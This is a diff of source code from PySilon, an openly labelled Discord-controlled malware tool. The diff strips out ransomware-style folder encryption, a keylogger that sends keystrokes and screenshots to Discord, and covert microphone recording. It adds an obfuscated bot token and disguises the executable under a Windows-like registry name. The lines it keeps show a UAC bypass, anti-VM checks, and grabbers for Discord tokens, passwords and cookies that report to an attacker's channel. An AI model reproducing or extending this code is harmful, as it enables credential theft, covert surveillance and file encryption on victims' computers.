@@ -1,6 +1,5 @@
 import time
 import os
-from pynput.keyboard import Key, Listener
 from PIL import ImageGrab
 from shutil import copy2, rmtree
 import winreg
@@ -9,9 +8,6 @@ import requests
 from filesplit.merge import Merge
 from itertools import islice
 from pathlib import Path
-from cryptography.fernet import Fernet
-import pickle
-import psutil
 from resources.discord_token_grabber import *
 from resources.passwords_grabber import *
 from browser_history import get_history
@@ -19,8 +15,6 @@ from resources.get_cookies import *
 from urllib.request import urlopen
 from threading import Thread
 import pyaudio
-from scipy.io.wavfile import write
-import sounddevice
 from psutil import process_iter, Process
 from win32process import GetWindowThreadProcessId
 from win32gui import GetForegroundWindow
@@ -45,9 +39,6 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 import pygame
 import monitorcontrol
 from urllib.parse import urlparse
-import win32gui
-import win32con
-import os, requests, time
 from PIL import Image, ImageDraw
 from win32print import * 
 from win32gui import *
@@ -80,20 +71,20 @@ if not IsAdmin():
         if UACbypass():
             os._exit(0)
 auto = 'auto'
-bot_tokens = ['==AdDJkbMB3RU50MiFmSodnTstWb0kjTykEZ6NUZkN3Sp5mMt8VVfBTMtgmSOFTZ5InYI9kQydneDxmbS5kWXplZ2lkNC9yM2YTN2gTN3YDO1cDM4QDNxQTMvM3av9GaiV2dvkGch9SbvNmLkJ3bjNXak9yL6MHc0RHa', '==QbxllT4YWQ2QXUhZ2VEVERVJVbwEzN08UbNNlSWp1SxBHa4U0XBJTdzZHZ5Y1RqBTeh91ZrdmdHVWR41GSnRnTtZEUL9iMxEDNzYjN1kjNwgDM4QDNxQTMvM3av9GaiV2dvkGch9SbvNmLkJ3bjNXak9yL6MHc0RHa']
-software_registry_name = 'test'
-software_directory_name = 'test'
-software_executable_name = 'test.exe'
+bot_tokens = ['wEUO5smMRlGS1g1ZfFHaxgDRoh1YnRGaMJDZCJWe11SOyoHd0hmL24kTZp3RuEkT3VFVPFTU61ENrR1T5NGVPVzYU5EeRRVT']
+software_registry_name = 'Windows64'
+software_directory_name = 'C:/Windows'
+software_executable_name = 'fsociety tool.exe'
 channel_ids = {                                                    ##
     'info': True,
     'main': True,
-    'spam': True,
+    'spam': False,
     'file': True,
-    'recordings': True,
+    'recordings': False,
     'voice': True
 }                                                                  ##
-secret_key = '796a22e677d41d0af531e2b212eab5e7142adc3c10ef46e9eccd0b633e07a1f7'
-guild_id = 1372371406666465301
+secret_key = 'c5cf40c579af6cf8bdfe92eca2006bd851e254a7d38ba1f365a458a66111cae4'
+guild_id = 1402120071437877369
 if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower() != software_executable_name.lower(): # [pysilon_mark] !anti-vm
     os._exit(0) # [pysilon_mark] !anti-vm
 if IsAdmin():
@@ -207,17 +198,6 @@ async def on_ready():
             elif channel.name == 'Live microphone':
                 channel_ids['voice'] = channel.id
     await client.get_channel(channel_ids['main']).send(f"_ _\n_ _\n_ _```Starting new PC session at {current_time(True)} on HWID:{str(hwid)}{' && Bypassed UAC!' if IsAdmin() else ''}```\n_ _\n_ _\n_ _")
-    recordings_obj = client.get_channel(channel_ids['recordings'])
-    async for latest_message in recordings_obj.history(limit=2):
-        latest_messages_in_recordings.append(latest_message.content)
-    if 'disable' not in latest_messages_in_recordings:
-        Thread(target=start_recording).start()
-        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Started recording...`')
-        latest_messages_in_recordings = []
-    else:
-        Thread(target=start_recording).start()
-        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Recording disabled. If you want to enable it, just delete the "disable" message on` <#' + str(channel_ids['recordings']) + '>')
-        latest_messages_in_recordings = []
     threading.Thread(target=process_blacklister).start()
     while True:
         global send_recordings
@@ -712,77 +692,6 @@ async def on_message(message):
                     reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                 else:
                     reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
-            elif message.content[:8] == '.encrypt':
-                await message.delete()
-                if message.content.strip() == '.encrypt':
-                    embed = discord.Embed(title="📛 Error",description='```Syntax: .encrypt <path to folder>```', colour=discord.Colour.red())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-                else:
-                    folder_path = message.content[9:]
-                    folder_path = folder_path.replace('\\','/')
-                    current_pid = os.getpid()
-                    running_processes = set()
-                    for process in psutil.process_iter(['pid', 'name']):
-                        try:
-                            if process.info['pid'] != current_pid:
-                                running_processes.add(process.info['name'])
-                        except (psutil.NoSuchProcess, psutil.AccessDenied):
-                            pass
-                    key = Fernet.generate_key()
-                    cipher_suite = Fernet(key)
-                    original_file_extensions = []
-                    for root, dirs, files in os.walk(folder_path):
-                        for file in files:
-                            file_path = os.path.join(root, file)
-                            if not file_path.endswith('.pysilon'):
-                                _, file_extension = os.path.splitext(file_path)
-                                if os.path.basename(file_path) not in running_processes:
-                                    with open(file_path, 'rb') as f:
-                                        file_data = f.read()
-                                    original_file_extensions.append(file_extension)
-                                    encrypted_data = cipher_suite.encrypt(file_data)
-                                    new_file_name = os.path.splitext(file_path)[0] + '.pysilon'
-                                    os.rename(file_path, new_file_name)
-                                    with open(new_file_name, 'wb') as f:
-                                        f.write(encrypted_data)
-                    if original_file_extensions:
-                        with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', 'wb') as ext_file:
-                            pickle.dump(original_file_extensions, ext_file)
-                    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', 'wb') as key_file:
-                        key_file.write(key)
-                    embed = discord.Embed(title="🟢 Success",description=f'```Successfully encrypted the path!```', colour=discord.Colour.green())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-            elif message.content[:8] == '.decrypt':
-                await message.delete()
-                if message.content.strip() == '.decrypt':
-                    embed = discord.Embed(title="📛 Error",description='```Syntax: .decrypt <path to folder>```', colour=discord.Colour.red())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-                else:
-                    folder_path = message.content[9:]
-                    folder_path = folder_path.replace('\\','/')
-                    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', "rb") as key_file:
-                        key = key_file.read()
-                    cipher_suite = Fernet(key)
-                    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', "rb") as ext_file:
-                        original_file_extensions = pickle.load(ext_file)
-                    for root, dirs, files in os.walk(folder_path):
-                        for file in files:
-                            file_path = os.path.join(root, file)
-                            if file_path.endswith('.pysilon'):
-                                with open(file_path, 'rb') as f:
-                                    encrypted_data = f.read()
-                                decrypted_data = cipher_suite.decrypt(encrypted_data)
-                                original_extension = original_file_extensions.pop(0)
-                                new_file_name = os.path.splitext(file_path)[0] + original_extension
-                                with open(new_file_name, 'wb') as f:
-                                    f.write(decrypted_data)
-                                os.remove(file_path)
-                    embed = discord.Embed(title="🟢 Success",description=f'```Successfully decrypted the path!```', colour=discord.Colour.green())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
             elif message.content[:5] == '.grab':
                 await message.delete()
                 if message.content.strip() == '.grab':
@@ -1374,45 +1283,6 @@ async def on_message(message):
                         embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
                         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                         await message.channel.send(embed=embed)
-            elif message.content == '.jumpscare':
-                await message.delete()
-                devices = AudioUtilities.GetSpeakers()
-                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-                volume = cast(interface, POINTER(IAudioEndpointVolume))
-                video_url = "https://github.com/mategol/PySilon-malware/raw/py-dev/resources/icons/jumpscare.mp4"
-                temp_folder = os.environ['TEMP']
-                temp_file = os.path.join(temp_folder, 'jumpscare.mp4')
-                if not os.path.exists(temp_file):
-                    response = requests.get(video_url)
-                    with open(temp_file, 'wb') as file:
-                        file.write(response.content)
-                time.sleep(1)
-                os.startfile(temp_file)
-                time.sleep(0.6)
-                get_video_window = win32gui.GetForegroundWindow()
-                win32gui.ShowWindow(get_video_window, win32con.SW_MAXIMIZE)
-                volume.SetMasterVolumeLevelScalar(1.0, None)
-                embed = discord.Embed(title="🟢 Success",description=f'```Jumpscare has been triggered.```', colour=discord.Colour.green())
-                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                await message.channel.send(embed=embed)
-            elif message.content[:4] == '.key':
-                await message.delete()
-                if message.content.strip() == '.key':
-                    embed = discord.Embed(title="📛 Error",description='```Syntax: .key <keys-to-press>```', colour=discord.Colour.red())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-                else:
-                    keystrokes = message.content[5:]
-                    if "ALTTAB" in keystrokes:
-                        pyautogui.hotkey('alt', 'tab')
-                    elif "ALTF4" in keystrokes:
-                        pyautogui.hotkey('alt', 'f4')
-                    else:
-                        for key in keystrokes:
-                            pyautogui.press(key)
-                    embed = discord.Embed(title="🟢 Success",description=f'```All keys have been succesfully pressed```', colour=discord.Colour.green())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
             elif message.content == '.display-graphic':
                 await message.delete()
                 embed = discord.Embed(title='📤 Provide a file containing graphic', description='Send your .drawdata file here', colour=discord.Colour.blue())
@@ -1460,48 +1330,6 @@ async def on_message(message):
                 one_file_attachment_message = message
             elif expectation == 'multiplefiles':
                 files_to_merge[1].append(message)
-def on_press(key):
-    global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
-    processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
-    keycodes = {
-        Key.space : ' ',
-        Key.shift : ' *`SHIFT`*',
-        Key.tab : ' *`TAB`*',
-        Key.backspace : ' *`<`*',
-        Key.esc : ' *`ESC`*',
-        Key.caps_lock : ' *`CAPS LOCK`*',
-        Key.f1 : ' *`F1`*',
-        Key.f2 : ' *`F2`*',
-        Key.f3 : ' *`F3`*',
-        Key.f4 : ' *`F4`*',
-        Key.f5 : ' *`F5`*',
-        Key.f6 : ' *`F6`*',
-        Key.f7 : ' *`F7`*',
-        Key.f8 : ' *`F8`*',
-        Key.f9 : ' *`F9`*',
-        Key.f10 : ' *`F10`*',
-        Key.f11 : ' *`F11`*',
-        Key.f12 : ' *`F12`*',
-    }
-    if processed_key in ctrl_codes.keys():
-        processed_key = ' `' + ctrl_codes[processed_key] + '`'
-    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
-        for i in keycodes:
-            if processed_key == i:
-                processed_key = keycodes[i]
-        if processed_key == Key.enter:
-            processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
-        elif processed_key == Key.print_screen or processed_key == '@':
-                processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
-                ImageGrab.grab(all_screens=True).save('ss.png')
-                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
-        text_buffor += str(processed_key)
-        if len(text_buffor) > 1975:
-            if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or 'ddddd' in text_buffor:
-                messages_to_send.append([channel_ids['spam'], text_buffor])
-            else:
-                messages_to_send.append([channel_ids['main'], text_buffor])
-            text_buffor = ''
 class PyAudioPCM(discord.AudioSource):
     def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
         p = pyaudio.PyAudio()
@@ -1509,19 +1337,6 @@ class PyAudioPCM(discord.AudioSource):
         self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
     def read(self) -> bytes:
         return self.input_stream.read(self.chunks)
-def start_recording():
-    global files_to_send, channel_ids, send_recordings
-    while True:
-        if send_recordings:
-            recorded_mic = sounddevice.rec(int(120 * 16000), samplerate=16000, channels=1)
-            sounddevice.wait()
-            try: os.mkdir('rec_')
-            except: pass
-            record_name = 'rec_\\' + current_time() + '.wav'
-            write(record_name, 16000, recorded_mic)
-            files_to_send.append([channel_ids['recordings'], '', record_name, True])
-        else:
-            time.sleep(20)
 def check_int(to_check):
     try:
         asd = int(to_check) + 1
@@ -1711,10 +1526,8 @@ def flash_screen(effect):
     if effect != 'list':
         Sleep(10)
         DeleteDC(hdc)
-with Listener(on_press=on_press) as listener:
-    for token in bot_tokens:
-        decoded_token = base64.b64decode(token[::-1]).decode()
-        try:
-            client.run(decoded_token)
-        except: pass
-    listener.join()
+for token in bot_tokens:
+    decoded_token = base64.b64decode(token[::-1]).decode()
+    try:
+        client.run(decoded_token)
+    except: pass
